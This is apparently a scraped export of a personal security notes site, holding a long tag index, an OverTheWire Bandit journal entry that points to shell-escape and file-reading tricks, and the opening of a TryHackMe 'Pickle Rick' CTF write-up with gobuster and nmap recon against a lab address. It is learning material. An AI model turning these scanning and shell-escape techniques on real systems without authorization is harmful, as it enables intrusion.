class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Linux/Polkit&quot;&gt;OS/Linux/Polkit&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/macOS&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/macOS&quot;&gt;OS/macOS&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows&quot;&gt;OS/Windows&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows/ActiveDirectory&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows/ActiveDirectory&quot;&gt;OS/Windows/ActiveDirectory&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows/AMSI&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows/AMSI&quot;&gt;OS/Windows/AMSI&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows/Defender&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows/Defender&quot;&gt;OS/Windows/Defender&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows/Drivers&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows/Drivers&quot;&gt;OS/Windows/Drivers&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows/EventLog&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows/EventLog&quot;&gt;OS/Windows/EventLog&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows/Firewall&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows/Firewall&quot;&gt;OS/Windows/Firewall&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows/IIS&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows/IIS&quot;&gt;OS/Windows/IIS&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows/LSASS&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows/LSASS&quot;&gt;OS/Windows/LSASS&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows/Permissions&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows/Permissions&quot;&gt;OS/Windows/Permissions&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows/Permissions/SeAssignPrimaryToken&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows/Permissions/SeAssignPrimaryToken&quot;&gt;OS/Windows/Permissions/SeAssignPrimaryToken&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows/Permissions/SeBackup&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows/Permissions/SeBackup&quot;&gt;OS/Windows/Permissions/SeBackup&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows/Permissions/SeImpersonate&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows/Permissions/SeImpersonate&quot;&gt;OS/Windows/Permissions/SeImpersonate&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows/Permissions/SeRestore&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows/Permissions/SeRestore&quot;&gt;OS/Windows/Permissions/SeRestore&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows/Permissions/SeTakeOwnership&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows/Permissions/SeTakeOwnership&quot;&gt;OS/Windows/Permissions/SeTakeOwnership&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows/Registry&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows/Registry&quot;&gt;OS/Windows/Registry&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows/SAM&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows/SAM&quot;&gt;OS/Windows/SAM&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows/Server&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows/Server&quot;&gt;OS/Windows/Server&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows/Services&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows/Services&quot;&gt;OS/Windows/Services&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows/Tasks&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows/Tasks&quot;&gt;OS/Windows/Tasks&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows/UAC&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows/UAC&quot;&gt;OS/Windows/UAC&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows/UserInit&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows/UserInit&quot;&gt;OS/Windows/UserInit&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows/WinLogin&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows/WinLogin&quot;&gt;OS/Windows/WinLogin&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows/WMI&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows/WMI&quot;&gt;OS/Windows/WMI&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/OS/Windows/WSH&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/OS/Windows/WSH&quot;&gt;OS/Windows/WSH&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol&quot;&gt;Protocol&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/ARP&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/ARP&quot;&gt;Protocol/ARP&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/DCERPC&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/DCERPC&quot;&gt;Protocol/DCERPC&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/DNS&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/DNS&quot;&gt;Protocol/DNS&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/DRSUAPI&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/DRSUAPI&quot;&gt;Protocol/DRSUAPI&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/FTP&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/FTP&quot;&gt;Protocol/FTP&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/FTPS&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/FTPS&quot;&gt;Protocol/FTPS&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/Gemini&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/Gemini&quot;&gt;Protocol/Gemini&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/HTTP&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/HTTP&quot;&gt;Protocol/HTTP&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/ICMP&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/ICMP&quot;&gt;Protocol/ICMP&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/IMAP&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/IMAP&quot;&gt;Protocol/IMAP&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/IPSec&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/IPSec&quot;&gt;Protocol/IPSec&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/IPv4&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/IPv4&quot;&gt;Protocol/IPv4&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/IPv6&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/IPv6&quot;&gt;Protocol/IPv6&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/Kerberos&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/Kerberos&quot;&gt;Protocol/Kerberos&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/NetBIOS&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/NetBIOS&quot;&gt;Protocol/NetBIOS&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/NFS&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/NFS&quot;&gt;Protocol/NFS&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/POP3&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/POP3&quot;&gt;Protocol/POP3&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/RCP&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/RCP&quot;&gt;Protocol/RCP&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/RDP&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/RDP&quot;&gt;Protocol/RDP&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/SIP&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/SIP&quot;&gt;Protocol/SIP&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/SMB&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/SMB&quot;&gt;Protocol/SMB&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/SMTP&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/SMTP&quot;&gt;Protocol/SMTP&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/SOCKS&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/SOCKS&quot;&gt;Protocol/SOCKS&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/TCP&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/TCP&quot;&gt;Protocol/TCP&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/Telnet&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/Telnet&quot;&gt;Protocol/Telnet&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/TLS&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/TLS&quot;&gt;Protocol/TLS&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/UDP&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/UDP&quot;&gt;Protocol/UDP&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/WiFi&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/WiFi&quot;&gt;Protocol/WiFi&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/WinRM&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/WinRM&quot;&gt;Protocol/WinRM&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Protocol/X11&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Protocol/X11&quot;&gt;Protocol/X11&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Standard&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Standard&quot;&gt;Standard&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Standard/Base64&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Standard/Base64&quot;&gt;Standard/Base64&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Standard/HD&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Standard/HD&quot;&gt;Standard/HD&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Standard/JWT&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Standard/JWT&quot;&gt;Standard/JWT&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Standard/MITRE&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Standard/MITRE&quot;&gt;Standard/MITRE&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Standard/MITRE/Emulation&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Standard/MITRE/Emulation&quot;&gt;Standard/MITRE/Emulation&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Standard/OSI&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Standard/OSI&quot;&gt;Standard/OSI&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Standard/POSIX&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Standard/POSIX&quot;&gt;Standard/POSIX&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Standard/RegEx&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Standard/RegEx&quot;&gt;Standard/RegEx&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/Standard/URI&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/Standard/URI&quot;&gt;Standard/URI&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/WebApplication&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/WebApplication&quot;&gt;WebApplication&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/WebApplication/Gmail&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/WebApplication/Gmail&quot;&gt;WebApplication/Gmail&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/WebApplication/GooglePhotos&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/WebApplication/GooglePhotos&quot;&gt;WebApplication/GooglePhotos&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/WebApplication/IFTTT&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/WebApplication/IFTTT&quot;&gt;WebApplication/IFTTT&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;./tags/WebApplication/Netlify&quot; class=&quot;tag-link internal alias&quot; data-slug=&quot;tags/WebApplication/Netlify&quot;&gt;WebApplication/Netlify&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;"},"journals/2020-07-27":{"slug":"journals/2020-07-27","filePath":"journals/2020-07-27.md","title":"Bandit","links":["spells/Read-a-file-beginning-with-a-dash","spells/xxd","spells/Send-a-command-using-OpenSSL","spells/more","spells/Get-a-shell-from-ViM"],"tags":["Journal/Tale"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\n“Bandit” on OverTheWire\n\n\n\nBandit 2\nTransclude of ../spells/Read-a-file-beginning-with-a-dash\nBandit 13\nTransclude of ../spells/xxd\nBandit 16\nTransclude of ../spells/Send-a-command-using-OpenSSL\nBandit 26\nTransclude of ../spells/more\nTransclude of ../spells/Get-a-shell-from-ViM","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;&lt;a href=&quot;https://overthewire.org/wargames/bandit/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;“Bandit” on OverTheWire&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;h2 id=&quot;bandit-2&quot;&gt;Bandit 2&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#bandit-2&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;../spells/Read-a-file-beginning-with-a-dash&quot; data-block=&quot;&quot; data-embed-alias=&quot;Read a file beginning with a dash&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Read-a-file-beginning-with-a-dash&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Read-a-file-beginning-with-a-dash&quot;&gt;Transclude of ../spells/Read-a-file-beginning-with-a-dash&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;bandit-13&quot;&gt;Bandit 13&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#bandit-13&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;../spells/xxd&quot; data-block=&quot;&quot; data-embed-alias=&quot;xxd&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/xxd&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/xxd&quot;&gt;Transclude of ../spells/xxd&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;bandit-16&quot;&gt;Bandit 16&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#bandit-16&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;../spells/Send-a-command-using-OpenSSL&quot; data-block=&quot;&quot; data-embed-alias=&quot;Send a command using OpenSSL&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Send-a-command-using-OpenSSL&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Send-a-command-using-OpenSSL&quot;&gt;Transclude of ../spells/Send-a-command-using-OpenSSL&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;bandit-26&quot;&gt;Bandit 26&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#bandit-26&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;../spells/more&quot; data-block=&quot;&quot; data-embed-alias=&quot;more&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/more&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/more&quot;&gt;Transclude of ../spells/more&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;../spells/Get-a-shell-from-ViM&quot; data-block=&quot;&quot; data-embed-alias=&quot;Get a shell from ViM&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Get-a-shell-from-ViM&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Get-a-shell-from-ViM&quot;&gt;Transclude of ../spells/Get-a-shell-from-ViM&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;","rssInclude":true},"journals/2021-10-10":{"slug":"journals/2021-10-10","filePath":"journals/2021-10-10.md","title":"Pickle Rick","links":["spells/Burp-Suite","spells/gobuster","spells/Nmap","spells/SSH","spells/Nikto","spells/PHP","spells/cat","spells/sudo","spells/netcat"],"tags":["Journal/Tale"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\n“Pickle Rick” on TryHackMe\n\n\n\nBackground\nThis is a Rick &amp; Morty themed web server / CTF. The fact that I’ve never watched the show may put me at a disadvantage.\nThere are three flags (“ingredients Rick needs for a potion to transform themself from a pickle back into a human”). Because of how TryHackMe masks answers, we already know the basic form of these strings (* characters are unknown, but   and . characters are literals):\nFlag 1: **. ******* ****\nFlag 2: * ***** ****\nFlag 3: ***** *****\n\nI’m guessing that flag 1 begins with either numbers or an abbreviation (Mr.?). Flag 2 probably begins with A.\nBecause this is web server exploitation, it’s going to make sense to use Burp Suite. In order to make the experience a little more pleasant, I’m going to add a pattern of 10.10.158.139 (the IP address of the TryHackMe server I’m using) to FoxyProxy and then set it to “Use proxies based on their pre-defined patterns and priorities”; that way, only the CTF website will get proxied to Burp Suite.\nRecon\nThe server is running Apache 2.4.18 on some version of Ubuntu. The provided web page is very simple:\n\nHELP MORTY!\nListen Morty… I need your help, I’ve turned myself into a pickle again and this time I can’t change back!\nI need you to BURRRP… Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the BURRRRRRRRP, password was! Help Morty, Help!\n\nThere is no obvious place to login, upload files, or otherwise interact with the web server. No hint event that this is anything beyond a relatively static site (both jQuery and Bootstrap libraries are included, but there’s no hooks in the actual page.)\nThere’s a comment in the HTML that Rick’s username is R1ckRul3s.\nWe look for directories of interest using gobuster.\ngobuster dir \\\n\t-u http://10.10.158.139 \\\n\t-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\nDiscovered directories:\n\n/assets (website assets + a handful of Rick &amp; Morty image files)\n/server-status (returns 403)\n\nAlso probing the machine using Nmap.\nnmap -vv -A -oA pickle-rick -sS -p- 10.10.158.139\nOutput:\n# Nmap 7.91 scan initiated Sun Oct 10 14:17:34 2021 as: nmap -vv -A -oA pickle-rick -sS -p- 10.10.158.139\nNmap scan report for 10.10.158.139\nHost is up, received echo-reply ttl 61 (0.16s latency).\nScanned at 2021-10-10 14:17:36 MDT for 862s\nNot shown: 65533 closed ports\nReason: 65533 resets\nPORT   STATE SERVICE REASON         VERSION\n22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 1d:39:9b:09:99:36:f3:bc:fe:7c:83:99:92:3b:a7:6b (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNZgE8CuciddazUr3rzoeSLp5UUW7FSMH7iGPEnz6E0GioM0ctbDfUtlp2jEOcetG3lnKzzD1JMPBh98h7ImpMSdpOMHRliy58a5CaBDv7O2boOUYrw0BiL9xHjEoeewTuKqHrsOal+o2M/Cmiho6K0FcHBmmf0/COnaT824p6XK5z7PYLuwoMF2Ujimz2hIFCFRn3eID0nCiMXxOUVI0Gn+m1xSDdOIqO7n9btU0oknWQ/QHbEMwVi/Hdv5b7xoO/MqiEAKVmvmsA483n8+uqhjmVXeYr/r588dUod0M1EY56RLgeiSnFWZ5D1bGxknmd+wh64At8MG4jZyDEhuVZ\n|   256 ab:aa:da:0b:5b:22:01:bc:75:54:91:e8:2a:b6:60:9e (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP74j/YgHBTZzXewO7k01lKCsNhH0h+qZBH5pvKkwoLvkiwVrmFMphtT+cHsdV5KnijsoRQtMolZyblXdHbVoOQ=\n|   256 7f:32:1f:37:2a:58:e7:d0:fb:91:a4:8c:12:8e:2e:d6 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFz+Ck64qc+5h2JvTgz7WYaLU4z+yu79Ug8CaW2vgP/9\n80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Rick is sup4r cool\nNo exact OS matches for host (If you know what OS is running on it, see nmap.org/submit/ 